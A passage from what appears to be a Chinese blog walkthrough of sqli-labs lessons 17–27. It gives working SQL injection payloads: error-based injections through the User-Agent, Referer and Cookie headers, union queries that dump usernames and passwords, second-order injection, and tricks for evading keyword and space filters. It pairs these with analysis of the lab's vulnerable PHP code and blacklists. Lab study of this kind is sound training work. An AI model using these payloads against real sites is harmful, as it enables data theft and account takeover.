class="line"></span><br><span class="line"><span class="variable">$uname</span>=<span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  </span><br><span class="line"><span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>在<code>less-17</code>的<code>check_input()</code>中，对 username 进行各种转义的处理，所以此处不能使用username进行注入。</p>
<h4 id="函数简介"><a href="#函数简介" class="headerlink" title="函数简介"></a>函数简介</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">addslashes</span>() <span class="comment">#函数返回在预定义字符之前添加反斜杠的字符串，如单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL。</span></span><br><span class="line"><span class="title function_ invoke__">stripslashes</span>() <span class="comment">#函数删除由 addslashes() 函数添加的反斜杠。</span></span><br><span class="line"><span class="title function_ invoke__">mysql_real_escape_string</span>() <span class="comment">#函数转义 SQL 语句中使用的字符串中的特殊字符,如\x00，\n，\r，\，&#x27;，&quot;，\x1a。</span></span><br></pre></td></tr></table></figure>

<h3 id="Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入"><a href="#Less-18-POST-Header-Injection-Uagent-field-Error-based-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)"></a>Less-18 POST - Header Injection - Uagent field - Error based (基于错误的用户代理，头部POST注入)</h3><h4 id="手动注入-15"><a href="#手动注入-15" class="headerlink" title="手动注入"></a>手动注入</h4><p>利用抓包工具修改<code>user-agent</code>即可</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@version</span>),0x7e)) and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/HklOqKTNYZFoMuD.png" alt="18_2.png"></p>
<h4 id="源码分析-16"><a href="#源码分析-16" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>对 uname 和 passwd 进行了 check_input()函数的处理，所以我们在输入uname 和passwd上进行注入是不行的，但可以利用insert。</p>
<h3 id="Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入"><a href="#Less-19-POST-Header-Injection-Referer-field-Error-based-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)"></a>Less-19 POST - Header Injection - Referer field - Error based (基于头部的Referer POST报错注入)</h3><h4 id="手动注入-16"><a href="#手动注入-16" class="headerlink" title="手动注入"></a>手动注入</h4><p>修改<code>referer</code>即可。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@basedir</span>),0x7e)) and <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure>

<h4 id="源码分析-17"><a href="#源码分析-17" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入"><a href="#Less-20-POST-Cookie-injections-Uagent-field-Error-based-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)"></a>Less-20 POST - Cookie injections - Uagent field - Error based (基于错误的cookie头部POST注入)</h3><h4 id="手动注入-17"><a href="#手动注入-17" class="headerlink" title="手动注入"></a>手动注入</h4><p>添加<code>cookie</code>即可</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">uname=admin1&#x27;<span class="attribute">and</span> extractvalue(<span class="number">1</span>,concat(0x7e,(<span class="literal">select</span> @<span class="variable">@basedir</span>),0x7e))<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/05/17/VdL9Es5qwCboOKx.png" alt="20.png"></p>
<h4 id="源码分析-18"><a href="#源码分析-18" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line"><span class="variable">$passwd</span> = <span class="title function_ invoke__">check_input</span>(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="variable">$cookee</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Less-21-Cookie-Injection-Error-Based-complex-string"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string"></a>Less-21 Cookie Injection- Error Based- complex - string</h3><h4 id="手动注入-18"><a href="#手动注入-18" class="headerlink" title="手动注入"></a>手动注入</h4><p>对<code>Cookie</code>进行<code>base64</code>编码即可</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">Cookie：</span><br><span class="line">uname=YWRtaW4xJylhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBAQGJhc2VkaXIpLDB4N2UpKSM=</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-19"><a href="#源码分析-19" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))   	<span class="comment">// Quote if not a number</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&#x27;&quot;&#x27;</span>; <span class="comment">//添加了&quot;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)"></a>Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</h3><h4 id="手动注入-19"><a href="#手动注入-19" class="headerlink" title="手动注入"></a>手动注入</h4><p>与less-21一样需要base64编码</p>
<h4 id="源码分析-20"><a href="#源码分析-20" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">get_magic_quotes_gpc</span>())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="title function_ invoke__">ctype_digit</span>(<span class="variable">$value</span>))   	<span class="comment">// Quote if not a number</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;<span class="comment">//添加了&#x27;</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$value</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$value</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;uname&#x27;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$row1</span>[<span class="string">&#x27;username&#x27;</span>]), <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br></pre></td></tr></table></figure>

<h2 id="Page-2-Advanced-Injections"><a href="#Page-2-Advanced-Injections" class="headerlink" title="Page-2 (Advanced Injections)"></a>Page-2 (Advanced Injections)</h2><h3 id="Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型"><a href="#Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型" class="headerlink" title="Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)"></a>Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</h3><h4 id="手动注入-20"><a href="#手动注入-20" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#获取路径</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,@<span class="variable">@basedir</span>,<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取数据库名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(schema_name) from information_schema.schemata),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取security中所有表名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(table_name) from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取users中所有列名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(column_name) from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取users中username这一列内容</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(username) from security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string">#获取users中password这一列内容</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=-1&#x27;</span>union <span class="literal">select</span> <span class="number">1</span>,(<span class="literal">select</span> group_concat(password) from security.users limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#报错注入获取数据库名</span></span><br><span class="line"><span class="string">http://127.0.0.1:8081/sqli-labs/Less-23/?id=1&#x27;</span>or extractvalue(<span class="number">1</span>,concat(0x7e,database())) or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure>

<h4 id="源码分析-21"><a href="#源码分析-21" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line"><span class="variable">$reg</span> = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line"><span class="variable">$reg1</span> = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line"><span class="variable">$replace</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg1</span>, <span class="variable">$replace</span>, <span class="variable">$id</span>);</span><br></pre></td></tr></table></figure>

<p>过滤了<code>#</code>和<code>--</code>这两种注释符号。</p>
<h3 id="Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入"><a href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入" class="headerlink" title="Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)"></a>Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)</h3><h4 id="手动注入-21"><a href="#手动注入-21" class="headerlink" title="手动注入"></a>手动注入</h4><p>注册一个账号为<code>admin&#39;#</code>的账户</p>
<p><img src="https://s2.loli.net/2022/05/17/DHwAEfZskga84Cb.png" alt="24_1.png"></p>
<p>注册成功后在后台可以看到信息</p>
<p><img src="https://s2.loli.net/2022/05/17/r3VvX1DF96auLeI.png" alt="24_2.png"></p>
<p>用刚注册的账号登录并修改密码即可更改<code>admin</code>的密码</p>
<p><img src="https://s2.loli.net/2022/05/17/vnFTACyI8aXpM9J.png" alt="24_3.png"></p>
<h4 id="源码分析-22"><a href="#源码分析-22" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>

<h3 id="Less-25-Trick-with-OR-amp-AND-过滤了or和and"><a href="#Less-25-Trick-with-OR-amp-AND-过滤了or和and" class="headerlink" title="Less-25 Trick with OR &amp; AND (过滤了or和and)"></a>Less-25 Trick with OR &amp; AND (过滤了or和and)</h3><h4 id="绕过or和and过滤"><a href="#绕过or和and过滤" class="headerlink" title="绕过or和and过滤"></a>绕过or和and过滤</h4><p>（1）大小写变形 Or,OR,oR </p>
<p>（2）编码，hex，urlencode </p>
<p>（3）添加注释&#x2F;*or*&#x2F; </p>
<p>（4）利用符号 and&#x3D;&amp;&amp; or&#x3D;||</p>
<h4 id="手动注入-22"><a href="#手动注入-22" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25/?id=1&#x27;||1=1--+ </span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25/?id=1&#x27;<span class="attribute">OOrr</span> <span class="number">1</span>=<span class="number">1</span>--+ </span><br></pre></td></tr></table></figure>

<h4 id="源码分析-23"><a href="#源码分析-23" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Less-25a-Trick-with-OR-amp-AND-Blind-过滤了or和and的盲注"><a href="#Less-25a-Trick-with-OR-amp-AND-Blind-过滤了or和and的盲注" class="headerlink" title="Less-25a Trick with OR &amp; AND Blind (过滤了or和and的盲注)"></a>Less-25a Trick with OR &amp; AND Blind (过滤了or和and的盲注)</h3><h4 id="手动注入-23"><a href="#手动注入-23" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25a/?id=-1 <span class="attribute">UNION</span> <span class="literal">select</span> <span class="number">1</span>,@<span class="variable">@basedir</span>,<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="Less-26-Trick-with-comments-and-space-过滤了注释和空格的注入"><a href="#Less-26-Trick-with-comments-and-space-过滤了注释和空格的注入" class="headerlink" title="Less-26 Trick with comments and space (过滤了注释和空格的注入)"></a>Less-26 Trick with comments and space (过滤了注释和空格的注入)</h3><h4 id="手动注入-24"><a href="#手动注入-24" class="headerlink" title="手动注入"></a>手动注入</h4><p>我们可以用url编码进行绕过(这些编码在Windows下使用可能会出现问题)</p>
<p>%09 Tab键（水平）<br>%0a 新建一行<br>%0c 新的一页<br>%0d return 键<br>%0b Tab键（垂直）<br>%a0 空格</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-26/?id=1&#x27;anandd(updatexml(1,concat(0x7e,(<span class="attribute">select</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>));%00</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-24"><a href="#源码分析-24" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注"><a href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注" class="headerlink" title="less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)"></a>less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)</h3><h4 id="手动注入-25"><a href="#手动注入-25" class="headerlink" title="手动注入"></a>手动注入</h4><p>不能报错注入，直接盲注即可</p>
<h4 id="源码分析-25"><a href="#源码分析-25" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	<span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out slashes</span></span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-过滤了union和select的"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-过滤了union和select的" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (过滤了union和select的)"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (过滤了union和select的)</h3><h4 id="手动注入-26"><a href="#手动注入-26" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-27/?id=1&#x27;and(uPdatexml(1,conCat(0x7e,(<span class="attribute">selEct</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>));%00</span><br></pre></td></tr></table></figure>

<h4 id="源码分析-26"><a href="#源码分析-26" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);		<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);			<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span 